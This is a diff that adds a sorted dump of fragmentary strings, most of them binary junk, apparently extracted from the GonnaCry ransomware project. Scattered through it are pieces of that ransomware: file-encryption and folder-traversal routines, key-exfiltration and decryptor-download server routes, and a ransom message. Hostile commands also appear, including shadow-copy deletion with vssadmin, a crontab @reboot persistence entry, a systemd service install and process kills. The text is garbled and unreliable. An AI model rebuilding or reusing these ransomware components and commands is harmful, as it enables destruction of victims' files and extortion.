@@ -1,0 +1,1756 @@
+"( ""PyC"
+"(!(strcmp(ent->d_name, "".."""
+"(!,W\"
+"(!EVP_CipherFinal_ex(ctx, outbuf, &outlen"
+"(!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen"
+"(!l7M!P :,S"""
+"("""
+"("""""
+"(""%s\n"", l->info[2]"
+"("".GNNCRY"", """""
+"(""/"""
+"(""/decrypt/"", methods=['POST']"
+"(""/download-decryptor/"", methods=[""GET""]"
+"(""/download-gonnacry/"", methods=[""GET""]"
+"(""/etc/machine-id"""
+"(""/recive-keys/"", methods=['POST']"
+"(""2d"
+"(""3"
+"(""A?"
+"(""AES keys not found. Sorry but all your files are lost!"""
+"(""Decrypted message: %s\n"", decrypt"
+"(""Desktop Path: "" + Variables.desktop"
+"(""Encrypted message written to file.\n"""
+"(""Generating RSA (%d bits"
+"(""Image"", ""file://%s"""
+"(""Invalid private key!"", status=400, headers=headers"
+"(""KEY = %s IV = %s PATH = %s\n"", l->info[0], l->info[1], l->info[2]"
+"(""Message to encrypt: """
+"(""No content."", status=411, headers=headers"
+"(""Reading back encrypted message and attempting decryption...\n"""
+"(""Requesting to server to decrypt the private key"""
+"(""TESTE CRYPTO"""
+"(""Username: "" + Variables.username"
+"(""X`yb+"
+"(""Z"
+"(""\n%s\n%s\n"", keys->private_key, keys->public_key"
+"(""\nMSG [{}]"".format(post_data"
+"(""]66S5bDn@OK8"
+"(""abriu\n"""
+"(""chave: {}"".format(key"
+"(""cmd args: """
+"(""gd"
+"(""gonnacry"""
+"(""gonnacry-web-server"""
+"(""g~"
+"(""http://localhost:8000"""
+"(""key decrypted"""
+"(""killall daemon"""
+"(""l>"
+"(""machine Name: "" + Variables.machineName"
+"(""nao abriu \n"""
+"(""nothing to do here ..."", status=404, headers=headers"
+"(""out.bin"", ""r"""
+"(""out.bin"", ""w"""
+"(""private_key.key"""
+"(""public_key.key"""
+"(""ransomware name: "" + Variables.ransomwareName"
+"(""vEql"
+"(""yv"
+"(""{}Client private key decrypted and stored to disk{}"".format(GREEN, WHITE"
+"(""{}Decryption finished!{}"".format(GREEN, WHITE"
+"(""{}Importing the encrypted client private key"".format(WHITE"
+"(""{}OK{}"".format(GREEN, WHITE"
+"($""BQPB("
+"($,.!"
+"($,<@@B0"
+"(%(2]<,T"
+"(%N""Fa9"
+"(%zY""|X"
+"(&*r{JvT:Y1E1U:M!,[1]HU"
+"(&encrypted, desktop"
+"(&files, desktop"
+"(&files, home"
+"(&files, media"
+"(&files, test_path"
+"(&files, trash"
+"('', port"
+"('/5c{Qr""uvH"
+"('Content-type', 'text/html'"
+"('Error in the JSON', status=400, headers=headers"
+"('Wrong format key. Expected: b64encoded private key!', status=415, headers=headers"
+"('\n', ''"
+"('{} binary doesnt exist, compilation failed.'.format(program"
+"(('127.0.0.1', port"
+"((aes_key, base64.b64decode(ret[1]"
+"((encrypted_aes_key, base64_path"
+"((getline(&line, &len, f"
+"((key, base64_new_file_name"
+"().split(""\n"""
+"()V,"
+"(+0Z""{Ezez=,sJob@:+Aj65;Bj"
+"(,!+"
+"(,"
+"(,$"""
+"(,*."
+"(,,"
+"(,Kuz"
+"(,MEB"
+"(,X"
+"(,p2"
+"(,w&"
+"(-,Qjlo "
+"(/""rf#%h]"
+"(0	s/H,zNe:"
+"(0""0 0,040:0<0800+p,1!%"
+"(0,  0"
+"(0, len(msg"
+"(1""	"
+"(128, True"
+"(1q,"
+"(2Rc""V4?Te"
+"(32, True"
+"(4I>e$Ja+gJP""*"
+"(8,y4"
+"(9GrNi#/=+i,z2l`%,J|b"
+"(;6,w"
+"(<,`"
+"(<}MJ+,"
+"(=8EP>, (<`i9"
+"(=u1Q^^U"""
+"(?f,"
+"(A,i"
+"(A,n"
+"(A:_^""r"
+"(A~hV{7,vl"
+"(B*0VeS&km,"
+"(C,U"
+"(CI,"
+"(E7rLLXf,"
+"(FILE *in, FILE *out, char *key, char *iv"
+"(FX,Y9Y"
+"(Fe"""
+"(Fp"""
+"(G;o,"
+"(G_,b"
+"(HR,"
+"(I""y3q"
+"(Iw(,o#mJ"
+"(JU<m~6""C"
+"(K,C"
+"(KEY_LENGTH, PUB_EXP, NULL, NULL"
+"(List **files, char* start_path"
+"(List **l, char * desktop"
+"(List **l, char *file_path, char *key, char *iv"
+"(List *encrypted, List *files, char * desktop"
+"(List *files, List **encrypted, List **not_encrypted"
+"(List *l, char * desktop"
+"(List *l, char *desktop"
+"(McWl,"
+"(N1=hM""!"
+"(NULL, "" """
+"(NULL, "":"""
+"(NijR,"
+"(O,"
+"(Pcq,k:	.(-"
+"(Q,"
+"(Qk6to,{Rl"
+"(RED, WHITE"
+"(RSA_private_decrypt(encrypt_len, (unsigned char*"
+"(T3e"""
+"(U<c;""*lU_L"
+"(V"""
+"(Z""c*iG6"
+"(Z""t"
+"(Z,"
+"(Z8Z$Z4Z,Z<Z""Z2Z*Z:Z&Z6Z.Z>Z!Z1Z"
+"(Zl,D"
+"(\B @gR2,I/`Vws>CI`"
+"(^t[D;ns""`<\-F"
+"(_[1], 'rb'"
+"(`MY,"
+"(aKOp[-""{"
+"(aux->info[0], key"
+"(aux->info[1], iv"
+"(aux->info[2], file_path"
+"(b&jK"""
+"(base64.b64encode(os.path.join(actual_path, arq"
+"(bits, encode=False"
+"(buf, 0, BUF_SIZE"
+"(compiler, kernel, and so on"
+"(cp, "" """
+"(cp, file_types"
+"(crontab -l 2>/dev/null; echo ""@reboot {}"""
+"(ctx, 16"
+"(ctx, EVP_bf_cbc("
+"(ctx, NULL, NULL, key, iv, 0"
+"(ctx, NULL, NULL, key, iv, 1"
+"(dG52""M"
+"(data, status=200, headers=headers"
+"(decrypted, status=200, headers=headers"
+"(description='Build GonnaCry.', add_help=True"
+"(eG""/"
+"(enc, key"
+"(encrypt, sizeof(*encrypt"
+"(encrypted, desktop"
+"(encrypted, files, desktop"
+"(encrypted, new_name, key, iv"
+"(encrypted->info[2], ""rb"""
+"(encrypted_aes_key, client_private_key"
+"(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL"
+"(ent->d_name, ""."""
+"(file_name,  ""w"""
+"(file_name,  passes=1"
+"(filename, '.'"
+"(filepath, 'a'"
+"(files, &encrypted, &not_encrypted"
+"(files, desktop"
+"(files, full_path"
+"(files, path_to_file, NULL, NULL"
+"(files->info[2], ""rb"""
+"(found_file, 'rb'"
+"(full_path,""/"""
+"(full_path,new_dir"
+"(full_path,start_path"
+"(g""LoH'S"
+"(gzu*,>6"
+"(h,o"
+"(home, ""/"""
+"(home, pw->pw_dir"
+"(home, ransomware_name"
+"(host=host, port=port"
+"(id, private_encrypted_key"
+"(inbuf, 1, chunk_size, in"
+"(ip, time"
+"(iv, 0, 17"
+"(iv, 0, strlen(iv"
+"(iv, encrypted->info[1]"
+"(iv, token"
+"(j"""
+"(key, 0, 33"
+"(key, 0, strlen(key"
+"(key, base64.b64encode(new_file_name"
+"(key, encrypted->info[0]"
+"(key, token"
+"(l, path, key, iv"
+"(line, "":"""
+"(line, ""\n"""
+"(line, 0, strlen(line"
+"(line, l->info[0]"
+"(line, l->info[1]"
+"(line, l->info[2]"
+"(line, strlen(line"
+"(machine_id, key_to_be_sent"
+"(msg, KEY_LENGTH-1, stdin"
+"(msg, key"
+"(new_file, ""enc_files.gc"""
+"(new_file, ""r"""
+"(new_file, ""w"""
+"(new_file, ""your_encrypted_files.txt"""
+"(new_file, desktop"
+"(new_file_name, 'wb'"
+"(new_name, "".GNNCRY"""
+"(new_name, "".gc"""
+"(new_name, ""wb"""
+"(new_name, encrypted->info[2]"
+"(new_name, files->info[2]"
+"(not_encrypted, files->info[2], NULL, NULL"
+"(oJnc>,"
+"(old, new, key, iv"
+"(old_file_name, 'w'"
+"(os.path.join(actual_path, arq"
+"(os.path.join(ransomware_path, ""AES_encrypted_keys.txt"""
+"(os.path.join(ransomware_path, ""client_private_key.PEM"""
+"(os.path.join(ransomware_path, 'encrypted_client_private_key.key'"
+"(os.path.join(variables.ransomware_path, ""img.png"""
+"(outbuf, 1, outlen, out"
+"(p$p,p""p2p:p6p.p!p"
+"(p[';(IC$Q6q"""
+"(path, ""/"""
+"(path, ""/media/"""
+"(path, ""Desktop/"""
+"(path, ""asd/"""
+"(path, ""priv.key"""
+"(path, ""public.key"""
+"(path, ""tests/"""
+"(path, O_WRONLY"
+"(path, desktop"
+"(path, home"
+"(path, token"
+"(path, username"
+"(path_to_file, ent->d_name"
+"(path_to_file, start_path"
+"(pri, keypair, NULL, NULL, 0, NULL, NULL"
+"(pri, keys->private_key, pri_len"
+"(program, program"
+"(pub, keypair"
+"(pub, keys->public_key, pub_len"
+"(q#I""7["
+"(s""I2"
+"(s,"
+"(sB,Fz"
+"(self, data"
+"(self, enc"
+"(self, enc, decryption_key=None"
+"(self, key"
+"(self, path"
+"(self, raw"
+"(self, s"
+"(self.key, AES.MODE_CBC, iv"
+"(self.private_key_path, 'w'"
+"(self.private_key_path, 600"
+"(self.public_key_path, 'w'"
+"(server_address, data=private_encrypted_key"
+"(server_address, handler_class"
+"(server_class=HTTPServer, handler_class=S, port=80"
+"(socket.AF_INET, socket.SOCK_STREAM"
+"(stat(path, &stat_buf"
+"(stderr, ""Error decrypting message: %s\n"", err"
+"(stderr, ""Error encrypting message: %s\n"", err"
+"(string, strlen(string"
+"(trash , "".local/share/Trash/"""
+"(trash, 0, strlen(trash"
+"(trash, home"
+"(v,"
+"(variables.aes_encrypted_keys_path, 'w'"
+"(variables.client_public_key_path, 'r'"
+"(variables.client_public_key_path, 'wb'"
+"(variables.daemon_desktop, 'w'"
+"(variables.daemon_desktop, startup_path"
+"(variables.daemon_path, 'wb'"
+"(variables.daemon_service, '/lib/systemd/system/daemon.service'"
+"(variables.daemon_service, 'w'"
+"(variables.decryptor_path,'wb'"
+"(variables.encrypted_client_private_key_path, 'wb'"
+"(variables.gonnacry_path, 'wb'"
+"(variables.home, '.config/autostart'"
+"(yOL"""
+"(z"""
+"({87,*"
+"(~,`>Uz"
+(	
+(	.<B
+(	1O
+(	BGZ
+(	XKS
+(	^
+(	k
+( 
+( !
+( %m(R
+( 8 ef
+( E
+( M{g
+( ^GM_(
+( cu9Qt
+( {
+(!
+(!%
+(!&
+(!4
+(!D1P
+(!EBIQr
+(!J1
+(!R
+(!dot || dot == filename
+(!l->info[0]
+(!mDhB_01=
+(#	e
+(#	zV:ZOyX^
+(#
+(#!rsV
+(#&5oZ.vskD
+(#.8F
+(#5Y;
+(#8RPL5/
+(#<$#fi
+(#=
+(#=M
+(#K&~hR=;h
+(#MT(t(~
+(#TVd[
+(#]
+(#`
+(#`?l
+(#x^
+($
+($ 	
+($-W%
+($1(C
+($8(8j
+($SP:t9
+($U0
+($XZX
+($\
+($b
+($cjLXWZ-
+($hVK3
+($o
+($r;$rSO
+($sO
+($x 
+(%
+(%+Y>{h9f
+(%/|
+(%5B
+(%=
+(%I
+(%L|y
+(%V
+(%[m	rD
+(%c3_
+(%d bits
+(%h
+(%s+\g
+(&
+(&%
+(&A8.
+(&G
+(&JfS[C
+(&`4
+(&encrypted
+(&files
+(&l|
+(&not_encrypted
+('	
+('	=
+('
+(' '
+(' =4v
+('&
+(''
+(''3X 19;1=X?	(/*
+('-o>
+('./daemon'
+('/home/tarcisio/teste'
+(':
+('=
+('?h
+('Decrypting the files ...'
+('Ez*~
+('IYs:v A^]5^}z ~O
+('JeOcA
+('OpenSSH'
+('Q3^
+('Starting web server...'
+('UTF-8'
+('Virtual Machine' in ''.join(output
+('\n'
+('\n' in id
+('chmod +x daemon'
+('chmod +x decryptor'
+('daemon'
+('decryptor'
+('dist/base64{}'.format(program
+('dist/{}'.format(program
+('gnome-terminal --command .{}'.format(variables.decryptor_path
+('gonnacry'
+('kill -9 {}'.format(output
+('kill -9 {}'.format(pid_of_gonnacry
+('kill -9 {}'.format(pid_of_gonnacry2
+('killall ./daemon'
+('killall ./gonnacry'
+('killall gonnacry'
+('px
+('pzNI
+('qN
+('utf-8'
+('vssadmin.exe delete shadows /all /quiet'
+('xfce4-terminal --command=.{}'.format(variables.decryptor_path
+('~'
+((
+((K?
+((PS
+((Vy
+((XI_OK
+((dir=opendir(start_path
+((encrypt_len = RSA_public_encrypt(strlen(msg
+((ent = readdir(dir
+((fsize - shift >BUF_SIZE
+((sizeof(char
+((u:W	K}
+()
+() % (int
+() + process.stderr.read(
+() + process2.stderr.read(
+() + process3.stderr.read(
+()+^(^*^
+().ForEach(a => Console.WriteLine(a
+().exportKey('OpenSSH'
+().read(AES.block_size
+()/
+()6q&7+;S
+()8~u
+();
+()Jd*JR
+()\*_d
+()e2KYFYNY^YQUVS
+()m**
+()t rDE
+(*
+(*$
+(*$L'|Z
+(***
+(*/
+(*Z
+(*_VV
+(*g*g
+(*l
+(*l != NULL
+(*l == NULL
+(*q
+(*y
+(*z
+(+
+(+(+
+(+/(/
+(+8j<?
+(+@
+(+A?kF=Y#Y
+(+Fk8
+(+`sR$Co+x
+(+gt~
+(+{
+(+{~
+(+|qcK6T
+(-
+(-1
+(-@l*
+(-E
+(-VJkVitP:*.JW]Tz
+(-]{FA`ZC|J~pF
+(-jr
+(-kO8
+(-ol
+(-sqp
+(-txg[P
+(-yM
+(.
+(.8
+(.:
+(.Ag
+(.N[`Iw
+(.R
+(.]
+(.g>[42feO
+(.}
+(/
+(/2!0T/
+(/2C
+(/30]8
+(/B5[
+(/F
+(/F 
+(/Gzr1.
+(/J4Q-
+(/M
+(/TD\
+(/_
+(/|]&G
+(0
+(0(
+(03
+(0<Nx 
+(0W
+(0XJ3YHn
+(0d
+(0g}{+7/.ouiE|
+(0h]M
+(1
+(1 v(!c4yLv8j>
+(120
+(13
+(130
+(14>TD
+(16
+(19b(it%
+(1Cc32
+(1G
+(1H.~
+(1Jom4
+(1L
+(1R
+(1X
+(1bjP
+(1gD?6
+(1gz
+(1i
+(1k
+(1sVCzBJ`p
+(1t@j
+(1zu
+(1{EC~j
+(2
+(2$
+(200
+(2=&hdCbZG
+(2T
+(2^0
+(2ahD
+(2iA
+(3	z
+(3
+(30
+(312A
+(32
+(3:c
+(3<
+(3Tuec
+(3V#'x	Y
+(3h
+(3n:Juq
+(3p[^lD(K(
+(3y
+(4
+(4!4S
+(404
+(44
+(462&
+(46?
+(4:h_
+(4DBIe;P[3!JCm
+(4Z75u
+(4d1Y-
+(4tS
+(4v
+(4vUM
+(4w
+(4|
+(5
+(5#
+(5'(]D+
+(500
+(50Fr\d
+(5G
+(5M
+(5O
+(5[
+(5`e
+(5i
+(5q
+(5tQ]h9NQsPFF17
+(5{
+(5|
+(6
+(6 
+(65535
+(6:
+(6LXV#
+(6La@\pAp]
+(6WEbpzy
+(6]?xv
+(6]u
+(6^
+(6mx
+(7	Wz
+(7
+(7 :A
+(7&s
+(7'*S	.Qd<
+(72
+(72T_\?JSk
+(72kOgKS
+(7;
+(7Cw[U/?k
+(7EU
+(7E`
+(7N	
+(7Tl
+(7a2H
+(7q6]cYn-\p
+(7rH~
+(7s
+(7zVy-
+(8
+(8&qb
+(84<2:&.!
+(8H
+(8V(oTfJaLE
+(8XYml_
+(8d@WP
+(9
+(9HTp`>
+(9L::
+(9XQ9
+(9\R
+(9aWZs_?
+(9g1mIXJ
+(9mq
+(:
+(:!
+(:+z
+(:.Z
+(:64(
+(:;p6b^
+(:?-Xeo1~`R<
+(:J
+(:N
+(:W>^g
+(:uF
+(:y.
+(:|
+(;
+(;.r y
+(;9a
+(;?=8=<5NO
+(;LB<4vZvFum
+(;Q
+(;R?:ZPO
+(;^h
+(;a8;
+(;cB^
+(;d* 
+(;f
+(;mEg
+(;w5TSS9u
+(;}zh?v_
+(<
+(<#5.o*=XHT
+(<3
+(<6	Xh
+(<<26kW;|}H'
+(<=E
+(<F
+(<F~E
+(<M
+(<U
+(<c^
+(<d\
+(<oV
+(<v	
+(=
+(= 
+(=&
+(=&gt
+(=5
+(=<
+(=CW
+(=F^h~Z'
+(=I%6
+(=L;Y
+(=g3$&
+(=iv_tS
+(>	`
+(>
+(>%
+(>0
+(>3
+(>46J`SkUmdTg
+(>5
+(>GRX
+(>_
+(>h
+(>iND
+(>w=
+(?
+(?/?C
+(???
+(?Ib3
+(?Q=}@
+(?y%i:
+(?z^
+(@
+(@2
+(@4 j
+(@;^#
+(@H
+(@O+|^=
+(@VS
+(@Z($[s
+(@ZBd
+(@bFXj'iX`
+(@mrVR
+(@o&
+(A	*
+(A
+(A'D#u<
+(A'{Auqz
+(A*!_\
+(A/
+(A5
+(AIoftsFQ
+(AKXt
+(AM1p
+(AOY[UZ'
+(AU
+(A[;<
+(A]|
+(B
+(B%5D
+(B(
+(B*:
+(B-
+(B3eM$
+(B4Kby
+(B7
+(B=
+(BA
+(BG
+(BIO_s_mem(
+(BU
+(BUF_SIZE
+(Ba-\Yy6T8M}
+(BaseHTTPRequestHandler
+(Bc#
+(Bp_}
+(Bs
+(C
+(C%7R
+(C5}KH7.764rJ
+(C7.
+(CA
+(CC
+(CFLAGS
+(CJ
+(CM(%
+(Cg=
+(Client_public_key
+(Cm;
+(Cp[0
+(D
+(D-c
+(D.YHYF
+(D/
+(D1
+(D:20171026143827-03'00'
+(DA
+(DE
+(DJ
+(DK/e'D
+(DKwK
+(Dd@
+(Debian 4.8.4-1
+(Debian 4.9.2-10
+(Debian 6.3.0-18+deb9u1
+(DzW
+(E
+(E&3O
+(E(
+(E(]OP
+(E.hxk
+(E9Nx_N!(41Vz;
+(EKu+[V&G6A
+(EO
+(EP5-
+(ERR_get_error(
+(EX 
+(Ec
+(EncList
+(Encoding.UTF8.GetString(key
+(Environment.SpecialFolder.Desktop
+(Exception ex
+(E~o|H!
+(F
+(F>
+(FDd g1
+(FDiF
+(FE&^g
+(FFG
+(FILE
+(FZ<&Sv
+(F_
+(FileExtensions.allowedExtensions.ContainsKey(Path.GetExtension(file.ToUpper(
+(Fj
+(Fv
+(FxxAv5>
+(Fz(
+(G
+(G$
+(G%Qz4
+(G'
+(G*G
+(GO1Xlr8
+(GT/3f
+(GTbiClr
+(GWr
+(G^!mxjC1-Z
+(Gb2ft
+(Gr
+(GtNx:u;
+(H	^Z7Bn
+(H
+(H+QCfIc
+(H@:!C#Sz
+(HC
+(HCnY<
+(HHBCJSKAN
+(HWK
+(HX
+(H_
+(Hj
+(H{
+(H}HHz0H}PHz8H}XHz@H}`HzHH}hHzPL
+(I	n|'
+(I
+(I$KR$i4I$C
+(IF!t
+(IK
+(IList<string> path
+(IO|Q
+(IQ
+(IR
+(IdNR7
+(Ip
+(J
+(J$	6EP
+(J(
+(J7UHYQ
+(J>c2
+(J@A~lq
+(JEz>
+(JI9f
+(JK
+(JVot+
+(Jb
+(K
+(K!U
+(K#
+(K1lK[
+(K3
+(K?
+(KEY
+(KMXXp
+(K_=
+(Ka~
+(KrG$:
+(K{sQ{}!AHw(0wY
+(L	$
+(L
+(L.tK
+(LCO
+(LL`5
+(LU
+(LV`
+(List
+(List **l
+(List *encrypted
+(List *l
+(List*
+(L|
+(M
+(M$
+(M0
+(M4bh+
+(M5G3IXk YD
+(M6Q
+(MLK*
+(MPWRDVIVd
+(MQA
+(MQL0%^
+(MZO
+(Mcf9J 
+(MonoDevelop/Xamarin Studio
+(M|b
+(N
+(N;|
+(NB
+(NI
+(NV1
+(Nb
+(NbG	
+(Nkp?
+(Nr@a/
+(Ns
+(Nu
+(Ny
+(O
+(O&gIL;6fIuC?
+(O/1
+(O5
+(O7=}
+(O9
+(O<t
+(O>6
+(OUTPUT
+(P
+(P!+
+(P&p
+(P'uW
+(P(
+(P+5
+(P3m
+(P<5O2#j?
+(PATH
+(PTVS
+(PVf
+(P_
+(Pd
+(PgqV~kO
+(Pi4N
+(Pn
+(Ptgz|^-]
+(PyyTui
+(Q
+(Q4#%ms
+(QPL=
+(QS
+(QW14
+(Qa
+(Qi*
+(Qj
+(Qln2=b$b
+(Qrz>*
+(R
+(R$\
+(R2R
+(R:4
+(R:b
+(RA
+(RHcdrZ
+(RM
+(RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider(
+(RSA_size(keypair
+(RTpFm7S
+(Rb
+(Ry
+(S
+(S#&=w
+(S%Za
+(S4:|SymOt
+(S<
+(SK
+(SM
+(SV^
+(Sa2
+(SecureString s
+(Sn
+(Ss
+(String
+(Su:J
+(T
+(T(Mw
+(T*EF;/
+(TA8%URs
+(TGxIyk0S=
+(TI/o
+(TTR
+(TUXNoP
+(TYQH<
+(Task.Run((
+(T}VH
+(U
+(U }a
+(U@8
+(UC2U#
+(UCa
+(UF
+(UH
+(UH2
+(USnO
+(U_
+(Uj
+(UjJuRSU
+(Up
+(Uuc<
+(Uy
+(V
+(V#(x
+(V$
+(V&1
+(V(5D5k47b7MQUa!
+(V*V
+(V?
+(VM6k%
+(V`3H 0
+(VbnE#HLF
+(Vf
+(V|
+(W
+(W'
+(W(
+(W-9RU	
+(W4
+(W96f*}1:X$
+(WFT
+(WI
+(WP\23SO
+(Wc
+(We
+(WgH
+(Wm
+(WmyB{&Upnh
+(Wq
+(Wx 
+(Wx=
+(X
+(XFH+[S4
+(XIc
+(XJ}YyvP
+(XLd2x
+(XNA*;}
+(XZo/
+(X^^Y
+(X`
+(Xamarin productivity tool
+(Xb
+(Xp
+(Xr
+(Xt
+(Xz~
+(X|+/H`
+(Y	
+(Y
+(Y&
+(Y4
+(Y7XM?Y</vX>
+(Y@bG/JX9
+(YA]
+(YBb]
+(YQ
+(YXx
+(YZ2}
+(Y]
+(Yi>?@nQ_H
+(Yi^Ai5
+(Yz
+(Z
+(Z3I'
+(Z6
+(Z8
+(Z>~
+(ZAq
+(ZYe2A[Og(cs
+(Zeroing
+(Zk
+(Zn
+([
+([0-9]
+([0-9][0-9]
+([0_1
+([6:j
+([=
+([N
+([T&gb:
+([T(#b& '
+([XU*4
+([[
+([[*9
+([bCD^
+([t I
+(\
+(\%
+(\+H
+(\SaN
+(\U
+(\Z
+(\bN=
+(\gX
+(\iR*
+(\k_K/XTpnY
+(\ui=
+(\vB
+(\z>~SJ
+(]	
+(]	9
+(]
+(]$
+(]8~
+(]I@]i
+(]X1[
+(]Y>*
+(]ZK/vg4h
+(]cQ@%pgYh*a<
+(]eAWkl;YK31I:B.#^T?D	NO
+(]jf
+(]v
+(^
+(^/
+(^ST%
+(^aJ_R=I
+(^f]X7a
+(^g-
+(^q
+(^q1HnnX
+(^vzx
+(^x7
+(_
+(_/r:^/WyA
+(_1c
+(_7}sp
+(_=
+(_C#f
+(_[0]
+(_[1]
+(_]
+(_{]
+(`
+(`'
+(`*
+(`1q
+(`<
+(`?<X'
+(`P
+(`]g
+(`f^
+(a
+(a$
+(a$>VB
+(a7
+(aF
+(aZ
+(aes_key
+(aes_keys_and_base64_path
+(alias
+(aq{
+(argv
+(at your option
+(aux
+(aux->info[i]
+(aw2o!_FD}X
+(a|=
+(b
+(b'yT
+(b/>
+(b?XM
+(b@V$O
+(b@c
+(bP@
+(back
+(base64.b64decode(variables.daemon
+(base64.b64decode(variables.decryptor
+(base64.b64decode(variables.gonnacry
+(base64.b64decode(variables.img
+(base64.b64encode(encrypted_aes_key
+(base64_encrypted
+(bfy2!Z%
+(bits
+(buf
+(bx
+(c
+(c!HA&
+(c$C
+(c+
+(c-Y
+(cCME
+(cK
+(c]
+(char *
+(char * desktop
+(char * home
+(char * username
+(char *home
+(char *path
+(char*
+(chars
+(cipher.decrypt(enc[AES.block_size:]
+(cipher.private_key_PEM
+(cipher.public_key_PEM
+(ciphertext
+(client_private_key
+(client_public_key
+(client_public_key_obj
+(client_public_key_object
+(command
+(command.format(process
+(commands
+(console
+(const char *filename
+(contains which files were open etc.
+(content
+(content_length
+(ctx
+(d
+(d+d'^*
+(d0
+(d:
+(dDpk]y9W
+(daemon
+(data
+(dd
+(decrypt
+(decrypted
+(decrypted_file_content
+(decryption_key
+(desktop
+(dhOUL{_5
+(dir
+(directory
+(dm	Bb
+(dv9%
+(e
+(e2 LR*
+(e2F
+(e8?V7t#=Z(9
+(e9:
+(eLmuBR|!
+(eMv[b
+(e_2gz}Q
+(ed
+(elapsed
+(enc
+(encode
+(encrypt
+(encrypt_len
+(encrypted
+(encrypted != NULL
+(encrypted->info[2]
+(encrypted_file_content
+(ent->d_name
+(ent->d_type == 4
+(ent->d_type == 8
+(ep
+(err
+(error
+(ew%
+(ext != NULL
+(f
+(f != NULL
+(f(
+(f*f
+(f5T]'~
+(f9%5
+(fE
+(fG
+(fI
+(fL_ s
+(fO
+(f[;?}B
+(fd
+(fd == -1
+(fe
+(file
+(file_content
+(file_format.get(extensao
+(file_name
+(file_path
+(files
+(files != NULL
+(files->info[2]
+(files.Count
+(foo~
+(found_file
+(fsize - shift
+(full_path
+(fz
+(f{
+(g
+(g'
+(g7
+(g:.YD`
+(gC6R@
+(gWN
+(g]]
+(gas
+(generate_key(32
+(gnome
+(grj.Jt
+(gtL>O
+(g|
+(h	wdjqN
+(h
+(h#
+(h-
+(h8OH
+(h:BTg(@
+(h;
+(h?
+(hMVmK
+(hM^b
+(hO%_:F'
+(hdd^e
+(home
+(https://docs.python.org/3/tutorial/datastructures.html
+(https://docs.python.org/3/whatsnew/3.6.html
+(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
+(https://github.com/github/gitignore/pull/2483#issue-259490424
+(https://github.com/tarcisio-marinho
+(https://github.com/tarcisio-marinho/GonnaCry
+(https://github.com/tarcisio-marinho/GonnaCry/blob/master/LICENSE
+(https://github.com/tarcisio-marinho/GonnaCry/stargazers
+(https://img.shields.io/badge/made%20with-%3C3-red.svg
+(https://img.shields.io/cran/l/devtools.svg
+(https://img.shields.io/github/stars/tarcisio-marinho/GonnaCry.svg
+(https://img.shields.io/travis/rust-lang/rust/master.svg
+(https://www.facebook.com/OneDayUmay1
+(https://www.facebook.com/groups/python.brasil/?fref=nf
+(i
+(i%^5O
+(i**9
+(i1B
+(i4KZ$6IC
+(i=0;i<Desktops.length;i++
+(iH_>!D
+(iJ
+(iP
+(if you work as a programmer
+(ijBE:qdW7qtE
+(in
+(inc. Windows DLLs
+(independent of having been made by running the Program
+(inlen <= 0
+(inn.%>bI
+(int i; i < 3; i++
+(int length
+(int n = 0;n < length;n++
+(int(passes
+(invalid multibyte string
+(is_path(home
+(is_path(path
+(is_path(trash
+(it{4
+(iv
+(iv + cipher.encrypt(raw
+(j	eN
+(j
+(j 
+(j>?????*;???/
+(jG
+(jWa|
+(jYc
+(jd
+(jmBh*.
+(jq`Y
+(ju=vOd
+(jvg;:w:
+(j~;
+(k
+(k(
+(k9A
+(kH
+(kImvM
+(kX&A`EV
+(kde
+(key
+(key == NULL && iv == NULL
+(key_obj
+(keypair
+(keys
+(keys->private_key
+(keys->public_key
+(l
+(l != NULL
+(l == NULL
+(l->info[0]
+(l->info[0] == NULL
+(l->info[1]
+(l->info[2]
+(l/
+(l1>
+(l5Hi
+(l?p
+(lH
+(lIcd|B1
+(lJ6nnz^:NQ
+(lWQ7
+(ld
+(len+1
+(length
+(length +1
+(line
+(lista
+(loWtwT'6`qj@SE^
+(logo
+(lr
+(ls5k/a
+(ltD5u
+(lz
+(m
+(m*R#]
+(m-08F#M
+(m-m
+(m1
+(m8
+(m9Omw(
+(m?hA3
+(mK%.[2_d
+(mYJ@
+(m^
+(mailto:tarcisio_marinho09@hotmail.com
+(media
+(mongo
+(msCPt:
+(msg
+(mysql
+(n
+(n&-
+(n9Y}g3I}D
+(n=t
+(nG&9;:
+(nJ;
+(nNUP
+(nX
+(new
+(new List<string>(
+(new_dir
+(new_file
+(new_file_name
+(new_files
+(new_name
+(not data
+(not files
+(not inside_VM(
+(not limited to patent issues
+(not os.path.isfile(file_name
+(nq{CSdgoI-Ja
+(o
+(o1]9
+(o6
+(oAka
+(oF/j
+(oW
+(o]V
+(object
+(object_encrypted
+(oc.e[~
+(of~.vU
+(oiNL
+(oig
+(old
+(old != NULL
+(opK
+(or with a work based on the Program
+(os.getuid(
+(os.path.expanduser('~'
+(os.path.isdir(caminho
+(os.path.isdir(caminho2
+(out
+(output
+(output64
+(o|}|C?$W}|
+(p
+(p6H~
+(p9Pg
+(p; Y.*
+(pGwY$dyD9E(/
+(pPg
+(pPwH-m
+(pQF'
+(path
+(pool_info
+(port
+(port=int(argv[1]
+(postgres
+(ppb
+(pri
+(pri_len + 1
+(private_key
+(proc.stderr.readlines(
+(program
+(pub
+(pub_len + 1
+(pw->pw_dir
+(py*1
+(q
+(q+vK
+(q7V
+(q@hB
+(qIQU
+(qOFz
+(qQIu
+(qYxQM[{]-syEx
+(qbs'R
+(qd4
+(ql
+(qlN{a
+(qrG.y
+(qss/C3M9
+(r	
+(r
+(r-
+(r:?o:wG
+(r=w
+(rBeq
+(rPM*DDz
+(rXf}Y1Bc
+(r_
+(random.SystemRandom(
+(randomString
+(raw
+(recover file
+(result == 0
+(ret
+(ret == -1
+(ret[0]
+(rrp'
+(ru
+(ry
+(s
+(s hA$J
+(s&[^R+
+(s3
+(s;
+(s@bQ
+(sD
+(sG!&
+(sL
+(sU
+(sX#oUnsjIgv4zA&Nx(b?
+(s[len(s
+(s^'^B
+(sass
+(self
+(self.bit_len
+(self.bs - len(s
+(self.headers['Content-Length']
+(self.key
+(self.private_key_PEM
+(self.public_key_PEM
+(self.send_pool_info(
+(server_private_key
+(service
+(sizeof(List
+(sizeof(RSAKeys
+(sizeof(char
+(sizeof(charset
+(sn
+(snrEN9.B
+(startup_path
+(stdout
+(str(encrypted_client_private_key
+(strcmp(get_filename_ext(path_to_file
+(string directory in Directory.GetDirectories(path
+(string file in Directory.GetFiles(directory
+(string path
+(string[] args
+(strlen(desktop
+(strlen(files->info[2]
+(strlen(start_path
+(strlen(token
+(t
+(t=
+(tA
